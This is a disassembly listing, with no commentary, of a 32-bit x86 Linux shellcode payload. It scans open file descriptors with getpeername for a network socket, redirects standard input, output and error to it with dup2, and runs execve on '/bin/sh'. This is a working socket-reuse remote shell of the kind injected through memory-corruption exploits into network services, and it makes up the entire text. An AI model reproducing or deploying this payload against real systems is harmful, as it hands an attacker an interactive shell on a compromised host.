```
.data:00000081 90                               nop
.data:00000082 eb 71                            jmp    0x000000f5
.data:00000084 5d                               pop    ebp
.data:00000085 31 c0                            xor    eax,eax
.data:00000087 31 db                            xor    ebx,ebx
.data:00000089 31 c9                            xor    ecx,ecx
.data:0000008b 31 d2                            xor    edx,edx
.data:0000008d 31 ff                            xor    edi,edi
.data:0000008f 31 f6                            xor    esi,esi
.data:00000091 b0 22                            mov    al,0x22
.data:00000093 89 c6                            mov    esi,eax
.data:00000095 b0 c0                            mov    al,0xc0
.data:00000097 b1 01                            mov    cl,0x1
.data:00000099 66 c1 e1 0c                      shl    cx,0xc
.data:0000009d b2 03                            mov    dl,0x3
.data:0000009f 4f                               dec    edi
.data:000000a0 cd 80                            int    0x80
.data:000000a2 89 c1                            mov    ecx,eax
.data:000000a4 31 ff                            xor    edi,edi
.data:000000a6 b3 02                            mov    bl,0x2
.data:000000a8 89 ca                            mov    edx,ecx
.data:000000aa 80 c1 04                         add    cl,0x4
.data:000000ad 31 c0                            xor    eax,eax
.data:000000af 66 b8 70 01                      mov    ax,0x170
.data:000000b3 fe c3                            inc    bl
.data:000000b5 c6 02 10                         mov    BYTE PTR [edx],0x10
.data:000000b8 89 39                            mov    DWORD PTR [ecx],edi
.data:000000ba cd 80                            int    0x80
.data:000000bc 39 f8                            cmp    eax,edi
.data:000000be 75 ed                            jne    0x000000ad
.data:000000c0 8b 01                            mov    eax,DWORD PTR [ecx]
.data:000000c2 3c 02                            cmp    al,0x2
.data:000000c4 75 e7                            jne    0x000000ad
.data:000000c6 89 ca                            mov    edx,ecx
.data:000000c8 31 c9                            xor    ecx,ecx
.data:000000ca 31 c0                            xor    eax,eax
.data:000000cc b0 3f                            mov    al,0x3f
.data:000000ce cd 80                            int    0x80
.data:000000d0 41                               inc    ecx
.data:000000d1 b0 3f                            mov    al,0x3f
.data:000000d3 cd 80                            int    0x80
.data:000000d5 41                               inc    ecx
.data:000000d6 b0 3f                            mov    al,0x3f
.data:000000d8 cd 80                            int    0x80
.data:000000da 31 c0                            xor    eax,eax
.data:000000dc 89 6d 08                         mov    DWORD PTR [ebp+0x8],ebp
.data:000000df 89 45 0c                         mov    DWORD PTR [ebp+0xc],eax
.data:000000e2 88 45 07                         mov    BYTE PTR [ebp+0x7],al
.data:000000e5 b0 0b                            mov    al,0xb
.data:000000e7 89 eb                            mov    ebx,ebp
.data:000000e9 8d 4d 08                         lea    ecx,[ebp+0x8]
.data:000000ec 8d 55 0c                         lea    edx,[ebp+0xc]
.data:000000ef cd 80                            int    0x80
.data:000000f1 b0 01                            mov    al,0x1
.data:000000f3 cd 80                            int    0x80
.data:000000f5 e8 8a ff ff ff                   call   0x00000084
.data:000000fa 2f                               das    
.data:000000fb 62 69 6e                         bound  ebp,QWORD PTR [ecx+0x6e]
.data:000000fe 2f                               das    
.data:000000ff 73 68                            jae    0x00000169
.data:00000101 41                               inc    ecx
.data:00000102 41                               inc    ecx
.data:00000103 41                               inc    ecx
.data:00000104 41                               inc    ecx
.data:00000105 41                               inc    ecx
.data:00000106 41                               inc    ecx
.data:00000107 41                               inc    ecx
.data:00000108 41                               inc    ecx
.data:00000109 41                               inc    ecx
.data:0000010a 0a 00                            or     al,BYTE PTR [eax]
.data:0000010c 00 00                            add    BYTE PTR [eax],al
.data:0000010e 0d 00 00 00 8b                   or     eax,0x8b000000
.data:00000113 91                               xchg   ecx,eax
.data:00000114 98                               cwde   
.data:00000115 c3                               ret    
.data:00000116 ff 0a                            dec    DWORD PTR [edx]
```